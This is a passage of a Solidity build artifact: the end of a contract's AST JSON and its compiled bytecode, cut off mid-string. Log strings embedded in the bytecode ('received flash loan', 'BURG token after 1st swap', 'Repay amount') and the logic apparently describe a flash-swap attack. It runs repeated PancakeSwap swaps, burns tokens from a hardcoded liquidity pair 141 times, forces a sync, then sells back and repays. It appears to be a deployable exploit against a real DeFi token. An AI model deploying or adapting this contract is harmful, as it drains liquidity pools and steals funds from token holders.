                        "value": "0"
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "IndexAccess",
                      "src": "12507:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 1445,
                      "name": "_tokenIn",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1401,
                      "src": "12517:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "12507:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 1447,
                  "nodeType": "ExpressionStatement",
                  "src": "12507:18:0"
                },
                {
                  "expression": {
                    "id": 1452,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "baseExpression": {
                        "id": 1448,
                        "name": "path",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1432,
                        "src": "12535:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                          "typeString": "address[] memory"
                        }
                      },
                      "id": 1450,
                      "indexExpression": {
                        "hexValue": "31",
                        "id": 1449,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "12540:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1_by_1",
                          "typeString": "int_const 1"
                        },
                        "value": "1"
                      },
                      "isConstant": false,
                      "isLValue": true,
                      "isPure": false,
                      "lValueRequested": true,
                      "nodeType": "IndexAccess",
                      "src": "12535:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 1451,
                      "name": "_tokenOut",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1403,
                      "src": "12545:9:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "12535:19:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 1453,
                  "nodeType": "ExpressionStatement",
                  "src": "12535:19:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 1458,
                        "name": "amountIn",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1405,
                        "src": "12687:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 1459,
                        "name": "amountOut",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1407,
                        "src": "12713:9:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "id": 1460,
                        "name": "path",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1432,
                        "src": "12740:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                          "typeString": "address[] memory"
                        }
                      },
                      {
                        "id": 1461,
                        "name": "_to",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1409,
                        "src": "12762:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "expression": {
                          "id": 1462,
                          "name": "block",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": -4,
                          "src": "12783:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_magic_block",
                            "typeString": "block"
                          }
                        },
                        "id": 1463,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "timestamp",
                        "nodeType": "MemberAccess",
                        "src": "12783:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                          "typeString": "address[] memory"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "expression": {
                        "arguments": [
                          {
                            "id": 1455,
                            "name": "PANCAKE_SWAP_ROUTER",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 31,
                            "src": "12582:19:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 1454,
                          "name": "IPancakeRouter01",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1728,
                          "src": "12565:16:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                            "typeString": "type(contract IPancakeRouter01)"
                          }
                        },
                        "id": 1456,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "12565:37:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                          "typeString": "contract IPancakeRouter01"
                        }
                      },
                      "id": 1457,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 1601,
                      "src": "12565:104:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (uint256,uint256,address[] memory,address,uint256) external"
                      }
                    },
                    "id": 1464,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "12565:247:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1465,
                  "nodeType": "ExpressionStatement",
                  "src": "12565:247:0"
                }
              ]
            },
            "id": 1467,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "swapIt",
            "nameLocation": "12111:6:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 1410,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 1401,
                  "mutability": "mutable",
                  "name": "_tokenIn",
                  "nameLocation": "12135:8:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1467,
                  "src": "12127:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1400,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "12127:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 1403,
                  "mutability": "mutable",
                  "name": "_tokenOut",
                  "nameLocation": "12161:9:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1467,
                  "src": "12153:17:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1402,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "12153:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 1405,
                  "mutability": "mutable",
                  "name": "amountIn",
                  "nameLocation": "12188:8:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1467,
                  "src": "12180:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 1404,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "12180:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 1407,
                  "mutability": "mutable",
                  "name": "amountOut",
                  "nameLocation": "12217:9:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1467,
                  "src": "12209:17:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 1406,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "12209:7:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 1409,
                  "mutability": "mutable",
                  "name": "_to",
                  "nameLocation": "12284:3:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 1467,
                  "src": "12276:11:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1408,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "12276:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "12117:176:0"
            },
            "returnParameters": {
              "id": 1411,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "12303:0:0"
            },
            "scope": 1472,
            "src": "12102:717:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 1470,
              "nodeType": "Block",
              "src": "12852:2:0",
              "statements": []
            },
            "id": 1471,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 1468,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "12832:2:0"
            },
            "returnParameters": {
              "id": 1469,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "12852:0:0"
            },
            "scope": 1472,
            "src": "12825:29:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1473,
        "src": "419:12437:0",
        "usedErrors": []
      }
    ],
    "src": "32:12825:0"
  },
  "bytecode": "6080604052600080546001600160a01b031990811673bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c179091556001805490911673f40d33de6737367a1ccb0ce6a056698d993a17e117905534801561005857600080fd5b50613053806100686000396000f3fe60806040526004361061002d5760003560e01c806384800812146100395780639d9e465c1461005b57600080fd5b3661003457005b600080fd5b34801561004557600080fd5b50610059610054366004612b97565b61007b565b005b34801561006757600080fd5b50610059610076366004612c2d565b6126e4565b6000336001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100bb573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100df9190612c59565b90506000336001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610121573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101459190612c59565b60405163e6a4390560e01b81526001600160a01b0380851660048301528216602482015290915060009073ca143ce32fe78f1f7019d7d551a6402fc5350c739063e6a4390590604401602060405180830381865afa1580156101ab573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101cf9190612c59565b9050336001600160a01b038216146102255760405162461bcd60e51b81526020600482015260146024820152734e6f742061207061697220636f6e74726163742160601b60448201526064015b60405180910390fd5b6001600160a01b03881630146102675760405162461bcd60e51b815260206004820152600760248201526610b9b2b73232b960c91b604482015260640161021c565b60008061027686880188612c2d565b6040805181815260138183015272436f6e74726163742062616c616e636520697360681b60608201524760208201529051929450909250600080516020612ffe833981519152919081900360800190a16040805160028082526060808301845269043c25e0dcc1bd1c00009390929190602083019080368337019050509050600080516020612f9e8339815191528160008151811061031757610317612c93565b60200260200101906001600160a01b031690816001600160a01b031681525050600080516020612f7e8339815191528160018151811061035957610359612c93565b6001600160a01b03909216602092830291909101909101526040516307c0329d60e21b8152606090600080516020612fbe83398151915290631f00ca74906103a79086908690600401612ced565b600060405180830381865afa1580156103c4573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526103ec9190810190612d0e565b6000546040516370a0823160e01b8152306004820152919250600080516020612ffe833981519152916001600160a01b03909116906370a0823190602401602060405180830381865afa158015610447573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061046b9190612dcc565b6040516104ce919060408082526033908201527f57424e422062616c616e6365206f6620636f6e7472616374206166746572207260608201527232b1b2b4bb3b34b73390333630b9b43637b0b760691b6080820152602081019190915260a00190565b60405180910390a1600080516020612ffe833981519152816000815181106104f8576104f8612c93565b602002602001015160405161054991906040808252602b90820152600080516020612fde83398151915260608201526a10212aa923903a37b5b2b760a91b6080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156105a7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105cb9190612dcc565b6040516105d89190612de5565b60405180910390a1610624600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6020026020010151600030612986565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906106579086908690600401612ced565b600060405180830381865afa158015610674573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261069c9190810190612d0e565b9050600080516020612ffe833981519152816000815181106106c0576106c0612c93565b602002602001015160405161072391906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722031737420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610781573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107a59190612dcc565b6040516107b29190612de5565b60405180910390a16107ee600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906108219086908690600401612ced565b600060405180830381865afa15801561083e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526108669190810190612d0e565b9050600080516020612ffe8339815191528160008151811061088a5761088a612c93565b60200260200101516040516108ed91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e20616674657220326e6420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa15801561094b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061096f9190612dcc565b60405161097c9190612de5565b60405180910390a16109b8600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906109eb9086908690600401612ced565b600060405180830381865afa158015610a08573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610a309190810190612d0e565b9050600080516020612ffe83398151915281600081518110610a5457610a54612c93565b6020026020010151604051610ab791906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722033726420737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610b15573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b399190612dcc565b604051610b469190612de5565b60405180910390a1610b82600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610bb59086908690600401612ced565b600060405180830381865afa158015610bd2573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610bfa9190810190612d0e565b9050600080516020612ffe83398151915281600081518110610c1e57610c1e612c93565b6020026020010151604051610c8191906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722034746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610cdf573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610d039190612dcc565b604051610d109190612de5565b60405180910390a1610d4c600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610d7f9086908690600401612ced565b600060405180830381865afa158015610d9c573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610dc49190810190612d0e565b9050600080516020612ffe83398151915281600081518110610de857610de8612c93565b6020026020010151604051610e4b91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722035746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015610ea9573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ecd9190612dcc565b604051610eda9190612de5565b60405180910390a1610f16600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490610f499086908690600401612ced565b600060405180830381865afa158015610f66573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052610f8e9190810190612d0e565b9050600080516020612ffe83398151915281600081518110610fb257610fb2612c93565b602002602001015160405161101591906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722036746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611073573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110979190612dcc565b6040516110a49190612de5565b60405180910390a16110e0600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906111139086908690600401612ced565b600060405180830381865afa158015611130573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526111589190810190612d0e565b9050600080516020612ffe8339815191528160008151811061117c5761117c612c93565b60200260200101516040516111df91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722037746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa15801561123d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906112619190612dcc565b60405161126e9190612de5565b60405180910390a16112aa600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906112dd9086908690600401612ced565b600060405180830381865afa1580156112fa573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526113229190810190612d0e565b6000546040516370a0823160e01b8152306004820152919250600080516020612ffe833981519152916001600160a01b03909116906370a0823190602401602060405180830381865afa15801561137d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906113a19190612dcc565b6040516113ae9190612de5565b60405180910390a1600080516020612ffe833981519152816000815181106113d8576113d8612c93565b602002602001015160405161143b91906040808252603c90820152600080516020612fde83398151915260608201527f204255524720746f6b656e2061667465722038746820737761703a20000000006080820152602081019190915260a00190565b60405180910390a1611477600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906114aa9086908690600401612ced565b600060405180830381865afa1580156114c7573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526114ef9190810190612d0e565b9050611525600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906115589086908690600401612ced565b600060405180830381865afa158015611575573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261159d9190810190612d0e565b90506115d3600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906116069086908690600401612ced565b600060405180830381865afa158015611623573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f1916820160405261164b9190810190612d0e565b9050611681600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906116b49086908690600401612ced565b600060405180830381865afa1580156116d1573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526116f99190810190612d0e565b905061172f600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906117629086908690600401612ced565b600060405180830381865afa15801561177f573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526117a79190810190612d0e565b90506117dd600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906118109086908690600401612ced565b600060405180830381865afa15801561182d573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526118559190810190612d0e565b905061188b600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca74906118be9086908690600401612ced565b600060405180830381865afa1580156118db573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526119039190810190612d0e565b9050611939600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca749061196c9086908690600401612ced565b600060405180830381865afa158015611989573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526119b19190810190612d0e565b90506119e7600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611a1a9086908690600401612ced565b600060405180830381865afa158015611a37573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611a5f9190810190612d0e565b9050611a95600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611ac89086908690600401612ced565b600060405180830381865afa158015611ae5573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611b0d9190810190612d0e565b9050611b43600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6040516307c0329d60e21b8152600080516020612fbe83398151915290631f00ca7490611b769086908690600401612ced565b600060405180830381865afa158015611b93573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f19168201604052611bbb9190810190612d0e565b9050611bf1600080516020612f9e833981519152600080516020612f7e8339815191528360008151811061061457610614612c93565b6000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611c47573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611c6b9190612dcc565b604051611cc2919060408082526027908201527f57424e422042616c616e6365206f6620636f6e747261637420616674657220736060820152663bb0b83997171760c91b6080820152602081019190915260a00190565b60405180910390a1600080516020612ffe83398151915281600081518110611cec57611cec612c93565b602090810291909101810151604080518181529081018390527f486f77206d7563682049206e65656420666f7220616e6f74686572207377617060608201529182015260800160405180910390a160005b608d811015611dda57600154604051632770a7eb60e21b81527302b0551b656509754285eec81ee894338e14c5dd600482015269043c25e0dcc1bd1c000060248201526001600160a01b0390911690639dc29fac90604401600060405180830381600087803b158015611daf57600080fd5b505af1158015611dc3573d6000803e3d6000fd5b505050508080611dd290612e3a565b915050611d3d565b506001546040516370a0823160e01b81527302b0551b656509754285eec81ee894338e14c5dd6004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015611e45573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611e699190612dcc565b604051611eb091906040808252601c908201527f425552472062616c616e6365206f66205061636b6167652070616972000000006060820152602081019190915260800190565b60405180910390a17302b0551b656509754285eec81ee894338e14c5dd6001600160a01b031663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b158015611f0757600080fd5b505af1158015611f1b573d6000803e3d6000fd5b50505050611f53600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611f87600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611fbb600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b611fef600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612023600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612057600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61208b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6120bf600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6120f3600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612127600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61215b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61218f600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6121c3600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6121f7600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61222b600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b61225f600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b612293600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6122c7600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6122fb600080516020612f7e833981519152600080516020612f9e83398151915269043c33c1937564800000600030612986565b6001546040516370a0823160e01b815230600482015261239191600080516020612f7e83398151915291600080516020612f9e833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa158015612365573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906123899190612dcc565b600030612986565b6001546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156123e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061240b9190612dcc565b60405161245e919060408082526023908201527f425552472062616c616e6365206f6620636f6e7472616374206166746572207360608201526207761760ec1b6080820152602081019190915260a00190565b60405180910390a160006103e5612476866003612e53565b6124809190612e72565b61248b906001612e94565b905060006124998287612e94565b60405163a9059cbb60e01b81526001600160a01b038a81166004830152602482018390529192509088169063a9059cbb906044016020604051808303816000875af11580156124ec573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906125109190612eac565b5060408051818152600c818301526b14995c185e48185b5bdd5b9d60a21b6060820152602081018390529051600080516020612ffe8339815191529181900360800190a16000546040516370a0823160e01b8152306004820152600080516020612ffe833981519152916001600160a01b0316906370a0823190602401602060405180830381865afa1580156125aa573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906125ce9190612dcc565b60405161260c91906040808252601490820152730283937b334ba1030b33a32b9103932b830bc9d160651b6060820152602081019190915260800190565b60405180910390a1600154604080516318160ddd60e01b81529051600080516020612ffe833981519152926001600160a01b0316916318160ddd9160048083019260209291908290030181865afa15801561266b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061268f9190612dcc565b6040516126cb919060408082526012908201527102a37ba30b610212aa9239039bab838363c960751b6060820152602081019190915260800190565b60405180910390a1505050505050505050505050505050565b60405163e6a4390560e01b81526001600160a01b0383166004820152738ac76a51cc950d9822d68b83fe1ad97b32cd580d602482015260009073ca143ce32fe78f1f7019d7d551a6402fc5350c739063e6a4390590604401602060405180830381865afa158015612759573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061277d9190612c59565b90506001600160a01b0381166127cc5760405162461bcd60e51b81526020600482015260146024820152735061697220646f65736e2774206578697374732160601b604482015260640161021c565b6000816001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561280c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128309190612c59565b90506000826001600160a01b031663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015612872573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128969190612c59565b90506000826001600160a01b0316866001600160a01b0316146128ba5760006128bc565b845b90506000826001600160a01b0316876001600160a01b0316146128e05760006128e2565b855b9050846001600160a01b031663022c0d9f8383308b8b60405160200161291d9291906001600160a01b03929092168252602082015260400190565b6040516020818303038152906040526040518563ffffffff1660e01b8152